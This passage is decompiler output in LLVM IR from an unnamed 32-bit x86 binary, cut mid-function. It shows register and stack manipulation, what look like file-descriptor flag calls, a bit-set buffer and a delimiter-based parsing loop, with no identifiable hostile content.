  %v1_8049ce6 = load i32, i32* @esp, align 4
  %v2_8049ce6 = add i32 %v1_8049ce6, -4
  %v3_8049ce6 = inttoptr i32 %v2_8049ce6 to i32*
  store i32 %v0_8049ce6, i32* %v3_8049ce6, align 4
  %v1_8049ce7 = add i32 %v1_8049ce6, -8
  %v2_8049ce7 = inttoptr i32 %v1_8049ce7 to i32*
  store i32 0, i32* %v2_8049ce7, align 4
  %v1_8049ce9 = add i32 %v1_8049ce6, -12
  %v2_8049ce9 = inttoptr i32 %v1_8049ce9 to i32*
  store i32 3, i32* %v2_8049ce9, align 4
  %v2_8049ceb = add i32 %v1_8049ce6, -16
  %v3_8049ceb = inttoptr i32 %v2_8049ceb to i32*
  store i32 %v3_8049cd2, i32* %v3_8049ceb, align 4
  %v3_8049cec = call i32 @function_804adb0(i32 %stack_var_-2308.8, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049cf1 = load i32, i32* @esp, align 4
  %v12_8049cf4 = or i32 %v3_8049cec, 2048
  store i32 %v12_8049cf4, i32* %eax.global-to-local, align 4
  %v2_8049cf7 = add i32 %v0_8049cf1, 8
  %v3_8049cf7 = inttoptr i32 %v2_8049cf7 to i32*
  store i32 %v12_8049cf4, i32* %v3_8049cf7, align 4
  %v1_8049cf8 = add i32 %v0_8049cf1, 4
  %v2_8049cf8 = inttoptr i32 %v1_8049cf8 to i32*
  store i32 4, i32* %v2_8049cf8, align 4
  %v0_8049cfa = load i32, i32* @edi, align 4
  %v1_8049cfa = add i32 %v0_8049cfa, -8
  %v2_8049cfa = inttoptr i32 %v1_8049cfa to i32*
  %v3_8049cfa = load i32, i32* %v2_8049cfa, align 4
  %v6_8049cfa = inttoptr i32 %v0_8049cf1 to i32*
  store i32 %v3_8049cfa, i32* %v6_8049cfa, align 4
  %v3_8049cfd = call i32 @function_804adb0(i32 %stack_var_-2308.8, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049d02 = load i32, i32* @esp, align 4
  %v1_8049d02 = add i32 %v0_8049d02, 2344
  store i32 %v1_8049d02, i32* %eax.global-to-local, align 4
  %v1_8049d0c = add i32 %v0_8049d02, 8
  %v2_8049d0c = inttoptr i32 %v1_8049d0c to i32*
  store i32 16, i32* %v2_8049d0c, align 4
  %v0_8049d0e = load i32, i32* %eax.global-to-local, align 4
  %v2_8049d0e = add i32 %v0_8049d02, 4
  %v3_8049d0e = inttoptr i32 %v2_8049d0e to i32*
  store i32 %v0_8049d0e, i32* %v3_8049d0e, align 4
  %v0_8049d0f = load i32, i32* @edi, align 4
  %v1_8049d0f = add i32 %v0_8049d0f, -8
  %v2_8049d0f = inttoptr i32 %v1_8049d0f to i32*
  %v3_8049d0f = load i32, i32* %v2_8049d0f, align 4
  %v6_8049d0f = inttoptr i32 %v0_8049d02 to i32*
  store i32 %v3_8049d0f, i32* %v6_8049d0f, align 4
  %v4_8049d12 = call i32 @function_804b3ec(i32 %stack_var_-2308.8, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_8049d1a = add i32 %v4_8049d12, 1
  %v8_8049d1a = icmp eq i32 %v1_8049d1a, 0
  store i32 %v1_8049d1a, i32* %eax.global-to-local, align 4
  %v1_8049d1b = icmp eq i1 %v8_8049d1a, false
  br i1 %v1_8049d1b, label %dec_label_pc_8049d2b, label %dec_label_pc_8049d1d

dec_label_pc_8049d1d:                             ; preds = %dec_label_pc_8049ce6
  %v1_8049d1d = call i32 @function_804b330(i32 %stack_var_-2308.8)
  store i32 %v1_8049d1d, i32* %eax.global-to-local, align 4
  %v1_8049d22 = inttoptr i32 %v1_8049d1d to i32*
  %v2_8049d22 = load i32, i32* %v1_8049d22, align 4
  %v11_8049d22 = icmp eq i32 %v2_8049d22, 115
  %v1_8049d25 = icmp eq i1 %v11_8049d22, false
  br i1 %v1_8049d25, label %dec_label_pc_804a502, label %dec_label_pc_8049d2b

dec_label_pc_8049d2b:                             ; preds = %dec_label_pc_8049d1d, %dec_label_pc_8049ce6
  store i32 1, i32* @edx, align 4
  br label %dec_label_pc_804a515

dec_label_pc_8049d35:                             ; preds = %dec_label_pc_8049b28
  %v1_8049d35 = add i32 %v0_804a536, 2148
  store i32 %v1_8049d35, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v1_8049d35, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v3_8049d46 = inttoptr i32 %v1_8049d35 to i8*
  %v4_8049d46 = call i8* @_memset(i8* %v3_8049d46, i32 0, i32 32)
  %v0_8049d48 = load i32, i32* @esp, align 4
  %v1_8049d48 = add i32 %v0_8049d48, 84
  %v2_8049d48 = inttoptr i32 %v1_8049d48 to i32*
  %v3_8049d48 = load i32, i32* %v2_8049d48, align 4
  store i32 %v3_8049d48, i32* %edx.global-to-local, align 4
  %v1_8049d4c = add i32 %v3_8049d48, -8
  %v2_8049d4c = inttoptr i32 %v1_8049d4c to i32*
  %v3_8049d4c = load i32, i32* %v2_8049d4c, align 4
  %v1_8049d51 = urem i32 %v3_8049d4c, 32
  store i32 %v1_8049d51, i32* %eax.global-to-local, align 4
  %v2_8049d54 = udiv i32 %v3_8049d4c, 32
  store i32 %v2_8049d54, i32* %edx.global-to-local, align 4
  %v2_8049d57 = mul nuw nsw i32 %v2_8049d54, 4
  %v3_8049d57 = add i32 %v0_8049d48, 2148
  %v4_8049d57 = add i32 %v3_8049d57, %v2_8049d57
  %v5_8049d57 = inttoptr i32 %v4_8049d57 to i32*
  %v6_8049d57 = load i32, i32* %v5_8049d57, align 4
  %v9_8049d57 = shl i32 1, %v1_8049d51
  %v12_8049d57 = or i32 %v6_8049d57, %v9_8049d57
  store i32 %v12_8049d57, i32* %v5_8049d57, align 4
  %v0_8049d5f = load i32, i32* @esp, align 4
  %v1_8049d5f = add i32 %v0_8049d5f, 2352
  %v2_8049d5f = inttoptr i32 %v1_8049d5f to i32*
  store i32 0, i32* %v2_8049d5f, align 4
  %v0_8049d6a = load i32, i32* @esp, align 4
  %v1_8049d6a = add i32 %v0_8049d6a, 2356
  %v2_8049d6a = inttoptr i32 %v1_8049d6a to i32*
  store i32 100, i32* %v2_8049d6a, align 4
  %v0_8049d75 = load i32, i32* @esp, align 4
  %v1_8049d78 = add i32 %v0_8049d75, 2352
  store i32 %v1_8049d78, i32* %eax.global-to-local, align 4
  %v2_8049d7f = add i32 %v0_8049d75, -16
  %v3_8049d7f = inttoptr i32 %v2_8049d7f to i32*
  store i32 %v1_8049d78, i32* %v3_8049d7f, align 4
  %v1_8049d80 = add i32 %v0_8049d75, -20
  %v2_8049d80 = inttoptr i32 %v1_8049d80 to i32*
  store i32 0, i32* %v2_8049d80, align 4
  %v0_8049d82 = load i32, i32* @ebx, align 4
  %v2_8049d82 = add i32 %v0_8049d75, -24
  %v3_8049d82 = inttoptr i32 %v2_8049d82 to i32*
  store i32 %v0_8049d82, i32* %v3_8049d82, align 4
  %v1_8049d83 = add i32 %v0_8049d75, -28
  %v2_8049d83 = inttoptr i32 %v1_8049d83 to i32*
  store i32 0, i32* %v2_8049d83, align 4
  %v1_8049d85 = add i32 %v0_8049d75, 84
  %v2_8049d85 = inttoptr i32 %v1_8049d85 to i32*
  %v3_8049d85 = load i32, i32* %v2_8049d85, align 4
  %v1_8049d89 = add i32 %v3_8049d85, -8
  %v2_8049d89 = inttoptr i32 %v1_8049d89 to i32*
  %v3_8049d89 = load i32, i32* %v2_8049d89, align 4
  %v1_8049d8c = add i32 %v3_8049d89, 1
  store i32 %v1_8049d8c, i32* %eax.global-to-local, align 4
  %v2_8049d8d = add i32 %v0_8049d75, -32
  %v3_8049d8d = inttoptr i32 %v2_8049d8d to i32*
  store i32 %v1_8049d8c, i32* %v3_8049d8d, align 4
  %v5_8049d8e = call i32 @function_804b054(i32 %stack_var_-2308.8, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8049d8e, i32* %eax.global-to-local, align 4
  %v9_8049d96 = icmp eq i32 %v5_8049d8e, 1
  %v1_8049d99 = icmp eq i1 %v9_8049d96, false
  br i1 %v1_8049d99, label %dec_label_pc_8049e23, label %dec_label_pc_8049d9f

dec_label_pc_8049d9f:                             ; preds = %dec_label_pc_8049d35
  %v0_8049d93 = load i32, i32* @esp, align 4
  %v1_8049d9f = add i32 %v0_8049d93, 2396
  %v2_8049d9f = inttoptr i32 %v1_8049d9f to i32*
  store i32 0, i32* %v2_8049d9f, align 4
  %v0_8049daa = load i32, i32* @esp, align 4
  %v1_8049daa = add i32 %v0_8049daa, 2360
  %v2_8049daa = inttoptr i32 %v1_8049daa to i32*
  store i32 4, i32* %v2_8049daa, align 4
  %v0_8049db5 = load i32, i32* @esp, align 4
  %v1_8049db8 = add i32 %v0_8049db5, 2360
  %v2_8049dbf = add i32 %v0_8049db5, -16
  %v3_8049dbf = inttoptr i32 %v2_8049dbf to i32*
  store i32 %v1_8049db8, i32* %v3_8049dbf, align 4
  %v1_8049dc0 = add i32 %v0_8049db5, 2364
  store i32 %v1_8049dc0, i32* %eax.global-to-local, align 4
  %v2_8049dc7 = add i32 %v0_8049db5, -20
  %v3_8049dc7 = inttoptr i32 %v2_8049dc7 to i32*
  store i32 %v1_8049dc0, i32* %v3_8049dc7, align 4
  %v1_8049dc8 = add i32 %v0_8049db5, -24
  %v2_8049dc8 = inttoptr i32 %v1_8049dc8 to i32*
  store i32 4, i32* %v2_8049dc8, align 4
  %v1_8049dca = add i32 %v0_8049db5, -28
  %v2_8049dca = inttoptr i32 %v1_8049dca to i32*
  store i32 1, i32* %v2_8049dca, align 4
  %v1_8049dcc = add i32 %v0_8049db5, 84
  %v2_8049dcc = inttoptr i32 %v1_8049dcc to i32*
  %v3_8049dcc = load i32, i32* %v2_8049dcc, align 4
  store i32 %v3_8049dcc, i32* @edi, align 4
  %v1_8049dd0 = add i32 %v3_8049dcc, -8
  %v2_8049dd0 = inttoptr i32 %v1_8049dd0 to i32*
  %v3_8049dd0 = load i32, i32* %v2_8049dd0, align 4
  %v5_8049dd0 = add i32 %v0_8049db5, -32
  %v6_8049dd0 = inttoptr i32 %v5_8049dd0 to i32*
  store i32 %v3_8049dd0, i32* %v6_8049dd0, align 4
  %v0_8049dd3 = call i32 @function_804b442()
  store i32 %v0_8049dd3, i32* %eax.global-to-local, align 4
  %v0_8049dd8 = load i32, i32* @esp, align 4
  %v1_8049ddb = add i32 %v0_8049dd8, 2396
  %v2_8049ddb = inttoptr i32 %v1_8049ddb to i32*
  %v3_8049ddb = load i32, i32* %v2_8049ddb, align 4
  %v4_8049ddb = icmp eq i32 %v3_8049ddb, 0
  %v1_8049de3 = icmp eq i1 %v4_8049ddb, false
  br i1 %v1_8049de3, label %dec_label_pc_804a502, label %dec_label_pc_8049de9

dec_label_pc_8049de9:                             ; preds = %dec_label_pc_8049d9f
  %v2_8049de9 = add i32 %v0_8049dd8, 28
  %v3_8049de9 = inttoptr i32 %v2_8049de9 to i32*
  store i32 %v0_8049dd3, i32* %v3_8049de9, align 4
  %v1_8049dea = add i32 %v0_8049dd8, 24
  %v2_8049dea = inttoptr i32 %v1_8049dea to i32*
  store i32 0, i32* %v2_8049dea, align 4
  %v1_8049dec = add i32 %v0_8049dd8, 20
  %v2_8049dec = inttoptr i32 %v1_8049dec to i32*
  store i32 3, i32* %v2_8049dec, align 4
  %v1_8049dee = add i32 %v0_8049dd8, 116
  %v2_8049dee = inttoptr i32 %v1_8049dee to i32*
  %v3_8049dee = load i32, i32* %v2_8049dee, align 4
  store i32 %v3_8049dee, i32* %eax.global-to-local, align 4
  %v1_8049df2 = add i32 %v3_8049dee, -8
  %v2_8049df2 = inttoptr i32 %v1_8049df2 to i32*
  %v3_8049df2 = load i32, i32* %v2_8049df2, align 4
  %v5_8049df2 = add i32 %v0_8049dd8, 16
  %v6_8049df2 = inttoptr i32 %v5_8049df2 to i32*
  store i32 %v3_8049df2, i32* %v6_8049df2, align 4
  %v3_8049df5 = call i32 @function_804adb0(i32 %stack_var_-2308.8, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049dfa = load i32, i32* @esp, align 4
  %v1_8049dfd = udiv i32 %v3_8049df5, 256
  %v3_8049dfd = and i32 %v1_8049dfd, 247
  %v11_8049dfd = mul nuw nsw i32 %v3_8049dfd, 256
  %v12_8049dfd = and i32 %v3_8049df5, -65281
  %v13_8049dfd = or i32 %v11_8049dfd, %v12_8049dfd
  store i32 %v13_8049dfd, i32* %eax.global-to-local, align 4
  %v2_8049e00 = add i32 %v0_8049dfa, 8
  %v3_8049e00 = inttoptr i32 %v2_8049e00 to i32*
  store i32 %v13_8049dfd, i32* %v3_8049e00, align 4
  %v1_8049e01 = add i32 %v0_8049dfa, 4
  %v2_8049e01 = inttoptr i32 %v1_8049e01 to i32*
  store i32 4, i32* %v2_8049e01, align 4
  %v1_8049e03 = add i32 %v0_8049dfa, 100
  %v2_8049e03 = inttoptr i32 %v1_8049e03 to i32*
  %v3_8049e03 = load i32, i32* %v2_8049e03, align 4
  store i32 %v3_8049e03, i32* %edx.global-to-local, align 4
  %v1_8049e07 = add i32 %v3_8049e03, -8
  %v2_8049e07 = inttoptr i32 %v1_8049e07 to i32*
  %v3_8049e07 = load i32, i32* %v2_8049e07, align 4
  %v6_8049e07 = inttoptr i32 %v0_8049dfa to i32*
  store i32 %v3_8049e07, i32* %v6_8049e07, align 4
  %v3_8049e0a = call i32 @function_804adb0(i32 %stack_var_-2308.8, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 2, i32* @edx, align 4
  %v0_8049e14 = load i32, i32* @ebp, align 4
  store i32 %v0_8049e14, i32* @eax, align 4
  %v0_8049e16 = call i32 @function_80496f9()
  store i32 %v0_8049e16, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a52a

dec_label_pc_8049e23:                             ; preds = %dec_label_pc_8049d35
  %v1_8049e23 = add i32 %v5_8049d8e, 1
  %v8_8049e23 = icmp eq i32 %v1_8049e23, 0
  store i32 %v1_8049e23, i32* %eax.global-to-local, align 4
  br i1 %v8_8049e23, label %dec_label_pc_804a502, label %dec_label_pc_8049e2a

dec_label_pc_8049e2a:                             ; preds = %dec_label_pc_8049e23
  store i32 5, i32* @edx, align 4
  br label %dec_label_pc_804a523

dec_label_pc_8049e34:                             ; preds = %dec_label_pc_8049b28
  %v1_8049e34 = add i32 %v0_804a536, 23
  %v2_8049e34 = inttoptr i32 %v1_8049e34 to i8*
  %v3_8049e34 = load i8, i8* %v2_8049e34, align 1
  %v12_8049e34 = icmp eq i8 %v3_8049e34, 2
  store i32 6, i32* @edx, align 4
  br i1 %v12_8049e34, label %dec_label_pc_804a515, label %dec_label_pc_8049e44

dec_label_pc_8049e44:                             ; preds = %dec_label_pc_8049e34
  %v3_8049e44 = load i8, i8* %v2_8049e34, align 1
  %v12_8049e44 = icmp eq i8 %v3_8049e44, 3
  store i32 4, i32* @edx, align 4
  br i1 %v12_8049e44, label %dec_label_pc_804a515, label %dec_label_pc_8049e54

dec_label_pc_8049e54:                             ; preds = %dec_label_pc_8049e44
  %v3_8049e54 = load i8, i8* %v2_8049e34, align 1
  %v12_8049e54 = icmp eq i8 %v3_8049e54, 1
  store i32 3, i32* @edx, align 4
  br i1 %v12_8049e54, label %dec_label_pc_804a515, label %dec_label_pc_8049e64

dec_label_pc_8049e64:                             ; preds = %dec_label_pc_8049e54
  %v3_8049e64 = load i8, i8* %v2_8049e34, align 1
  %v12_8049e64 = icmp eq i8 %v3_8049e64, 4
  %v1_8049e69 = icmp eq i1 %v12_8049e64, false
  br i1 %v1_8049e69, label %dec_label_pc_8049e75, label %dec_label_pc_8049e6b

dec_label_pc_8049e6b:                             ; preds = %dec_label_pc_8049e64
  store i32 5, i32* @edx, align 4
  br label %dec_label_pc_804a515

dec_label_pc_8049e75:                             ; preds = %dec_label_pc_8049e64, %dec_label_pc_8049a60, %dec_label_pc_80497b7
  %v0_8049e75 = phi i32 [ %v15_804978d, %dec_label_pc_80497b7 ], [ %v0_804a536, %dec_label_pc_8049e64 ], [ %v15_804978d, %dec_label_pc_8049a60 ]
  %stack_var_-2308.2 = phi i32 [ %tmp52, %dec_label_pc_80497b7 ], [ %stack_var_-2308.8, %dec_label_pc_8049e64 ], [ %v4_8049821, %dec_label_pc_8049a60 ]
  %v1_8049e78 = add i32 %v0_8049e75, -16
  %v2_8049e78 = inttoptr i32 %v1_8049e78 to i32*
  store i32 0, i32* %v2_8049e78, align 4
  %v1_8049e7a = call i32 @function_804c440(i32 %stack_var_-2308.2)
  store i32 %v1_8049e7a, i32* %eax.global-to-local, align 4
  %v0_8049e7f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049e7f

dec_label_pc_8049e7f:                             ; preds = %dec_label_pc_8049b28, %dec_label_pc_8049e75
  %v5_8049e88 = phi i32 [ %v1_8049e7a, %dec_label_pc_8049e75 ], [ %v4_8049b3c, %dec_label_pc_8049b28 ]
  %v0_8049ea0 = phi i32 [ %v0_8049e7f.pre, %dec_label_pc_8049e75 ], [ %v0_804a536, %dec_label_pc_8049b28 ]
  %stack_var_-2308.3 = phi i32 [ %stack_var_-2308.2, %dec_label_pc_8049e75 ], [ %stack_var_-2308.8, %dec_label_pc_8049b28 ]
  %v1_8049e7f = add i32 %v0_8049ea0, 84
  %v2_8049e7f = inttoptr i32 %v1_8049e7f to i32*
  %v3_8049e7f = load i32, i32* %v2_8049e7f, align 4
  store i32 12, i32* @edx, align 4
  %v1_8049e88 = add i32 %v3_8049e7f, 1
  %v2_8049e88 = inttoptr i32 %v1_8049e88 to i8*
  %v3_8049e88 = load i8, i8* %v2_8049e88, align 1
  %v4_8049e88 = zext i8 %v3_8049e88 to i32
  %v6_8049e88 = and i32 %v5_8049e88, -256
  %v7_8049e88 = or i32 %v4_8049e88, %v6_8049e88
  store i32 %v7_8049e88, i32* %eax.global-to-local, align 4
  %v10_8049e8b = icmp eq i8 %v3_8049e88, 2
  br i1 %v10_8049e8b, label %dec_label_pc_804a515, label %dec_label_pc_8049e93

dec_label_pc_8049e93:                             ; preds = %dec_label_pc_8049e7f
  %v10_8049e93 = icmp eq i8 %v3_8049e88, 3
  store i32 14, i32* @edx, align 4
  br i1 %v10_8049e93, label %dec_label_pc_804a515, label %dec_label_pc_8049ea0

dec_label_pc_8049ea0:                             ; preds = %dec_label_pc_8049e93
  %v1_8049ea0 = add i32 %v0_8049ea0, -4
  %v2_8049ea0 = inttoptr i32 %v1_8049ea0 to i32*
  store i32 16384, i32* %v2_8049ea0, align 4
  %v1_8049ea5 = add i32 %v0_8049ea0, -8
  %v2_8049ea5 = inttoptr i32 %v1_8049ea5 to i32*
  store i32 17, i32* %v2_8049ea5, align 4
  %v1_8049ea7 = add i32 %v0_8049ea0, -12
  %v2_8049ea7 = inttoptr i32 %v1_8049ea7 to i32*
  store i32 ptrtoint ([18 x i8]* @global_var_804d4c8.58 to i32), i32* %v2_8049ea7, align 4
  %v3_8049eac = load i32, i32* %v2_8049e7f, align 4
  store i32 %v3_8049eac, i32* @edi, align 4
  %v1_8049eb0 = add i32 %v3_8049eac, -8
  %v2_8049eb0 = inttoptr i32 %v1_8049eb0 to i32*
  %v3_8049eb0 = load i32, i32* %v2_8049eb0, align 4
  %v5_8049eb0 = add i32 %v0_8049ea0, -16
  %v6_8049eb0 = inttoptr i32 %v5_8049eb0 to i32*
  store i32 %v3_8049eb0, i32* %v6_8049eb0, align 4
  %v0_8049eb3 = call i32 @function_804b516()
  store i32 %v0_8049eb3, i32* %eax.global-to-local, align 4
  store i32 9, i32* @edx, align 4
  %tmp80 = icmp slt i32 %v0_8049eb3, 1
  %tmp81 = icmp eq i1 %tmp80, false
  br i1 %tmp81, label %dec_label_pc_804a515, label %dec_label_pc_804a502

dec_label_pc_8049ecd:                             ; preds = %dec_label_pc_8049b28
  store i32 ptrtoint ([10 x i8]* @global_var_804d4da.59 to i32), i32* @edx, align 4
  store i32 %v1_8049b30, i32* @eax, align 4
  %v0_8049ed4 = call i32 @function_8049639()
  store i32 %v0_8049ed4, i32* %eax.global-to-local, align 4
  %v1_8049ed9 = icmp eq i32 %v0_8049ed4, 0
  %v1_8049edb = load i32, i32* @esp, align 4
  %v2_8049edb = add i32 %v1_8049edb, 32
  %v3_8049edb = inttoptr i32 %v2_8049edb to i32*
  store i32 %v0_8049ed4, i32* %v3_8049edb, align 4
  br i1 %v1_8049ed9, label %dec_label_pc_804a2cd, label %dec_label_pc_8049ee5

dec_label_pc_8049ee5:                             ; preds = %dec_label_pc_8049ecd
  %v1_8049ee5 = load i32, i32* @esp, align 4
  %v2_8049ee5 = add i32 %v1_8049ee5, -4
  %v3_8049ee5 = inttoptr i32 %v2_8049ee5 to i32*
  store i32 %v0_8049ed4, i32* %v3_8049ee5, align 4
  %v2_8049ee6 = add i32 %v1_8049ee5, -8
  %v3_8049ee6 = inttoptr i32 %v2_8049ee6 to i32*
  store i32 %v0_8049ed4, i32* %v3_8049ee6, align 4
  %v1_8049ee7 = add i32 %v1_8049ee5, -12
  %v2_8049ee7 = inttoptr i32 %v1_8049ee7 to i32*
  store i32 4, i32* %v2_8049ee7, align 4
  %v1_8049ee9 = add i32 %v1_8049ee5, -16
  %v2_8049ee9 = inttoptr i32 %v1_8049ee9 to i32*
  store i32 4, i32* %v2_8049ee9, align 4
  %v2_8049eeb = sext i32 %stack_var_-2308.8 to i64
  %v3_8049eeb = call i32 @function_804be6a(i64 %v2_8049eeb, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049eeb, i32* %eax.global-to-local, align 4
  %v0_8049ef0 = load i32, i32* @esp, align 4
  %v1_8049ef0 = add i32 %v0_8049ef0, 100
  %v2_8049ef0 = inttoptr i32 %v1_8049ef0 to i32*
  %v3_8049ef0 = load i32, i32* %v2_8049ef0, align 4
  store i32 %v3_8049ef0, i32* %edx.global-to-local, align 4
  %v0_8049ef4 = load i32, i32* @ebp, align 4
  %v1_8049ef4 = add i32 %v0_8049ef4, 18
  store i32 %v1_8049ef4, i32* @edi, align 4
  %v2_8049ef7 = add i32 %v3_8049ef0, 1028
  %v3_8049ef7 = inttoptr i32 %v2_8049ef7 to i32*
  store i32 %v3_8049eeb, i32* %v3_8049ef7, align 4
  %v0_8049efd = load i32, i32* @esp, align 4
  %v1_8049efd = add i32 %v0_8049efd, 2360
  %v2_8049efd = inttoptr i32 %v1_8049efd to i8*
  store i8 10, i8* %v2_8049efd, align 1
  %v0_8049f05 = load i32, i32* @esp, align 4
  %v1_8049f05 = add i32 %v0_8049f05, 2361
  %v2_8049f05 = inttoptr i32 %v1_8049f05 to i8*
  store i8 13, i8* %v2_8049f05, align 1
  %v0_8049f0d = load i32, i32* @esp, align 4
  %v1_8049f0d = add i32 %v0_8049f0d, 2362
  %v2_8049f0d = inttoptr i32 %v1_8049f0d to i8*
  store i8 61, i8* %v2_8049f0d, align 1
  %v0_8049f15 = load i32, i32* @esp, align 4
  %v1_8049f15 = add i32 %v0_8049f15, 2363
  %v2_8049f15 = inttoptr i32 %v1_8049f15 to i8*
  store i8 34, i8* %v2_8049f15, align 1
  %v0_8049f1d = load i32, i32* @esp, align 4
  %v1_8049f1d = add i32 %v0_8049f1d, 2364
  %v2_8049f1d = inttoptr i32 %v1_8049f1d to i8*
  store i8 32, i8* %v2_8049f1d, align 1
  %v0_8049f25 = load i32, i32* @esp, align 4
  %v1_8049f25 = add i32 %v0_8049f25, 2365
  %v2_8049f25 = inttoptr i32 %v1_8049f25 to i8*
  store i8 10, i8* %v2_8049f25, align 1
  %v0_8049f2d = load i32, i32* @esp, align 4
  %v1_8049f2d = add i32 %v0_8049f2d, 2366
  %v2_8049f2d = inttoptr i32 %v1_8049f2d to i8*
  store i8 13, i8* %v2_8049f2d, align 1
  %v0_8049f35 = load i32, i32* @esp, align 4
  %v1_8049f35 = add i32 %v0_8049f35, 2367
  %v2_8049f35 = inttoptr i32 %v1_8049f35 to i8*
  store i8 34, i8* %v2_8049f35, align 1
  %v0_8049f3d = load i32, i32* @edi, align 4
  %v1_8049f3d = load i32, i32* @esp, align 4
  %v2_8049f3d = inttoptr i32 %v1_8049f3d to i32*
  store i32 %v0_8049f3d, i32* %v2_8049f3d, align 4
  %v1_8049f40 = call i32 @function_804a688(i32 %stack_var_-2308.8)
  %v0_8049f45 = load i32, i32* @esp, align 4
  %v2_8049f48 = add i32 %v0_8049f45, 8
  %v3_8049f48 = inttoptr i32 %v2_8049f48 to i32*
  store i32 %v1_8049f40, i32* %v3_8049f48, align 4
  %v0_8049f49 = load i32, i32* @edi, align 4
  store i32 %v0_8049f49, i32* %eax.global-to-local, align 4
  %v2_8049f4b = add i32 %v0_8049f45, 48
  %v3_8049f4b = inttoptr i32 %v2_8049f4b to i32*
  %v4_8049f4b = load i32, i32* %v3_8049f4b, align 4
  %v5_8049f4b = add i32 %v4_8049f4b, %v0_8049f49
  store i32 %v5_8049f4b, i32* %eax.global-to-local, align 4
  %v2_8049f4f = add i32 %v0_8049f45, 4
  %v3_8049f4f = inttoptr i32 %v2_8049f4f to i32*
  store i32 %v5_8049f4b, i32* %v3_8049f4f, align 4
  %v0_8049f50 = load i32, i32* @edi, align 4
  %v3_8049f50 = inttoptr i32 %v0_8049f45 to i32*
  store i32 %v0_8049f50, i32* %v3_8049f50, align 4
  %v3_8049f51 = inttoptr i32 %stack_var_-2308.8 to i8*
  %v4_8049f51 = call i32 @function_804b35a(i8* %v3_8049f51, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049f51, i32* %eax.global-to-local, align 4
  %v0_8049f56 = load i32, i32* @esp, align 4
  %v1_8049f56 = add i32 %v0_8049f56, 72
  %v2_8049f56 = inttoptr i32 %v1_8049f56 to i32*
  store i32 0, i32* %v2_8049f56, align 4
  %v0_8049f5e = load i32, i32* @esp, align 4
  %v1_8049f5e = add i32 %v0_8049f5e, 16
  br label %dec_label_pc_8049fa4

dec_label_pc_8049f63:                             ; preds = %dec_label_pc_8049f63.lr.ph, %dec_label_pc_8049f87
  %v4_8049f67 = phi i32 [ %v4_8049f67.pre, %dec_label_pc_8049f63.lr.ph ], [ %v4_8049f67117, %dec_label_pc_8049f87 ]
  %v3_8049f8f109 = phi i32 [ %v3_8049f8f104, %dec_label_pc_8049f63.lr.ph ], [ %v3_8049f8f, %dec_label_pc_8049f87 ]
  %v3_8049f89108 = phi i32* [ %v3_8049f8992, %dec_label_pc_8049f63.lr.ph ], [ %v3_8049f89, %dec_label_pc_8049f87 ]
  %v0_8049f89107 = phi i32 [ 0, %dec_label_pc_8049f63.lr.ph ], [ %v1_8049f87, %dec_label_pc_8049f87 ]
  %v17_8049f8f106 = phi i32 [ %v1_8049f8932, %dec_label_pc_8049f63.lr.ph ], [ %v1_8049f8931, %dec_label_pc_8049f87 ]
  %v0_8049f67105 = phi i32 [ %v0_8049fa4, %dec_label_pc_8049f63.lr.ph ], [ %v1_8049f88, %dec_label_pc_8049f87 ]
  store i32 %v3_8049f8f109, i32* @ecx, align 4
  %v1_8049f67 = inttoptr i32 %v0_8049f67105 to i8*
  %v2_8049f67 = load i8, i8* %v1_8049f67, align 1
  %v3_8049f67 = zext i8 %v2_8049f67 to i32
  %v5_8049f67 = and i32 %v4_8049f67, -256
  %v6_8049f67 = or i32 %v5_8049f67, %v3_8049f67
  store i32 %v6_8049f67, i32* %eax.global-to-local, align 4
  %v4_8049f69 = add i32 %v17_8049f8f106, 2344
  %v5_8049f69 = add i32 %v4_8049f69, %v3_8049f8f109
  %v6_8049f69 = inttoptr i32 %v5_8049f69 to i8*
  %v7_8049f69 = load i8, i8* %v6_8049f69, align 1
  %v18_8049f69 = icmp eq i8 %v2_8049f67, %v7_8049f69
  %v1_8049f70 = icmp eq i1 %v18_8049f69, false
  br i1 %v1_8049f70, label %dec_label_pc_8049f87, label %dec_label_pc_8049f72

dec_label_pc_8049f72:                             ; preds = %dec_label_pc_8049f63
  %v2_8049f72 = add i32 %v17_8049f8f106, -4
  %v3_8049f72 = inttoptr i32 %v2_8049f72 to i32*
  store i32 %v6_8049f67, i32* %v3_8049f72, align 4
  %v3_8049f73 = load i32, i32* %v3_8049f89108, align 4
  %v1_8049f77 = load i32, i32* @esi, align 4
  %v2_8049f77 = sub i32 %v3_8049f73, %v1_8049f77
  %v2_8049f79 = add i32 %v17_8049f8f106, -8
  %v3_8049f79 = inttoptr i32 %v2_8049f79 to i32*
  store i32 %v2_8049f77, i32* %v3_8049f79, align 4
  %v0_8049f7a = load i32, i32* @ebx, align 4
  %v1_8049f7a = add i32 %v0_8049f7a, 1
  store i32 %v1_8049f7a, i32* %eax.global-to-local, align 4
  %v2_8049f7d = add i32 %v17_8049f8f106, -12
  %v3_8049f7d = inttoptr i32 %v2_8049f7d to i32*
  store i32 %v1_8049f7a, i32* %v3_8049f7d, align 4
  %v0_8049f7e = load i32, i32* @ebx, align 4
  %v2_8049f7e = add i32 %v17_8049f8f106, -16
  %v3_8049f7e = inttoptr i32 %v2_8049f7e to i32*
  store i32 %v0_8049f7e, i32* %v3_8049f7e, align 4
  %v4_8049f7f = call i32 @function_804b35a(i8* %v3_8049f51, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049f7f, i32* %eax.global-to-local, align 4
  %v0_8049f84 = load i32, i32* @esp, align 4
  %v1_8049f84 = add i32 %v0_8049f84, 16
  %v0_8049f87.pre = load i32, i32* @esi, align 4
